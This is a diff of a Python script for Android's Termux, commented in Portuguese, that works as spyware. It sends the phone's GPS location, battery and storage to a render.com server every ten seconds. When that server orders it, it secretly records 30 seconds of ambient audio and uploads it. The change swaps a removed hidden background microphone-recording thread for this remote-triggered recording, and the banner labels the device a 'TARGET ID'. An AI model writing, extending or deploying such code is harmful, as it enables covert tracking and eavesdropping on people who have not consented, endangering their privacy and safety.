@@ -4,56 +4,31 @@ import json
 import requests
 import os
 import base64
-import threading
+import uuid
 
 URL_SERVIDOR = "https://nexos-t0to.onrender.com/update"
 ARQUIVO_ID = os.path.expanduser("~/.nexos_device_id")
 ARQUIVO_AUDIO = os.path.expanduser("~/grampo.wav")
 
-audio_global_b64 = ""
-
 def run_command(cmd):
     try: return subprocess.check_output(cmd, shell=True).decode().strip()
     except: return ""
 
-def obter_id_unico():
+def obter_ou_criar_id_unico():
     if os.path.exists(ARQUIVO_ID):
         with open(ARQUIVO_ID, "r") as f: return f.read().strip()
-    novo_id = f"NX-{str(os.getpid())[:4].upper()}"
+    novo_id = f"NX-{str(uuid.uuid4())[:6].upper()}"
     with open(ARQUIVO_ID, "w") as f: f.write(novo_id)
     return novo_id
 
-DEVICE_ID = obter_id_unico()
+DEVICE_ID = obter_ou_criar_id_unico()
 
 print("\n" + "="*45)
-print(f"🤖  SISTEMA MULTI-THREAD NEXOS ATIVADO!")
-print(f"🔑  SEU MONITOR ID CONTINUA: {DEVICE_ID}")
+print(f"🤖 ECOSSISTEMA NEXOS COM COMANDO REMOTO ATIVO!")
+print(f"🔑 TARGET ID DO SEU APARELHO: {DEVICE_ID}")
 print("="*45 + "\n")
 
-# THREAD PARALELA: Fica gravando e quebrando o áudio de fundo de forma invisível
-def loop_gravacao_audio():
-    global audio_global_b64
-    while True:
-        try:
-            run_command("termux-microphone-record -q")
-            if os.path.exists(ARQUIVO_AUDIO): os.remove(ARQUIVO_AUDIO)
-            
-            # Grava no formato nativo .wav reconhecido instantaneamente por navegadores
-            subprocess.Popen(f"termux-microphone-record -f {ARQUIVO_AUDIO}", shell=True)
-            time.sleep(5)
-            run_command("termux-microphone-record -q")
-            
-            if os.path.exists(ARQUIVO_AUDIO) and os.path.getsize(ARQUIVO_AUDIO) > 500:
-                with open(ARQUIVO_AUDIO, "rb") as f:
-                    audio_global_b64 = base64.b64encode(f.read()).decode('utf-8')
-        except:
-            pass
-        time.sleep(1)
-
-# Ativa a thread do microfone antes de começar o envio principal
-threading.Thread(target=loop_gravacao_audio, daemon=True).start()
-
-def enviar_dados_principais():
+def executar_ciclo():
     battery = "N/A"
     out_bat = run_command("termux-battery-status")
     if out_bat:
@@ -70,6 +45,7 @@ def enviar_dados_principais():
                 if len(parts) >= 3: storage = f"{parts[3]} livres"
         except: pass
 
+    # GPS Estável Tradicional (Garante o pino cravado de forma leve)
     lat, lon = -16.6869, -49.2648
     out_loc = run_command("termux-location -p gps -r once")
     if out_loc:
@@ -86,17 +62,38 @@ def enviar_dados_principais():
         "uptime": "Ativo",
         "lat": lat,
         "lon": lon,
-        "audio_b64": audio_global_b64  # Puxa o último áudio coletado pela outra thread
+        "audio_b64": "" # Envia em branco no fluxo normal
     }
 
     try:
         response = requests.post(URL_SERVIDOR, json=payload, timeout=8)
-        if response.status_code == 200: 
-            print(f"📡 [PRINCIPAL] Localização enviada! GPS: {lat}, {lon}")
+        if response.status_code == 200:
+            print(f"📡 Sinal GPS OK! [{lat}, {lon}] | Bateria: {battery}%")
+            
+            # CHECA SE O SITE MANDOU GRAVAR ÁUDIO
+            dados_resposta = response.json()
+            if dados_resposta.get("comando_gravacao") == True:
+                print("🎙️ [ORDEM RECEBIDA] Gravando 30 segundos de áudio ambiental...")
+                run_command("termux-microphone-record -q")
+                if os.path.exists(ARQUIVO_AUDIO): os.remove(ARQUIVO_AUDIO)
+                
+                # Inicia a gravação e faz o Python esperar os 30s solicitados
+                subprocess.Popen(f"termux-microphone-record -f {ARQUIVO_AUDIO}", shell=True)
+                time.sleep(30)
+                run_command("termux-microphone-record -q")
+                
+                # Transforma o áudio .wav bruto e joga no servidor imediato
+                if os.path.exists(ARQUIVO_AUDIO) and os.path.getsize(ARQUIVO_AUDIO) > 500:
+                    with open(ARQUIVO_AUDIO, "rb") as f:
+                        payload["audio_b64"] = base64.b64encode(f.read()).decode('utf-8')
+                    
+                    requests.post(URL_SERVIDOR, json=payload, timeout=15)
+                    print("✅ Áudio de 30s transmitido com sucesso pro site!")
+                    
     except Exception as e:
-        print(f"❌ Falha de comunicação: {e}")
+        print(f"❌ Erro de rede: {e}")
 
-# LOOP PRINCIPAL: Roda liso e livre a cada 8 segundos sem travar com sleep longo
+# Loop limpo e leve a cada 10 segundos
 while True:
-    enviar_dados_principais()
-    time.sleep(8)
+    executar_ciclo()
+    time.sleep(10)
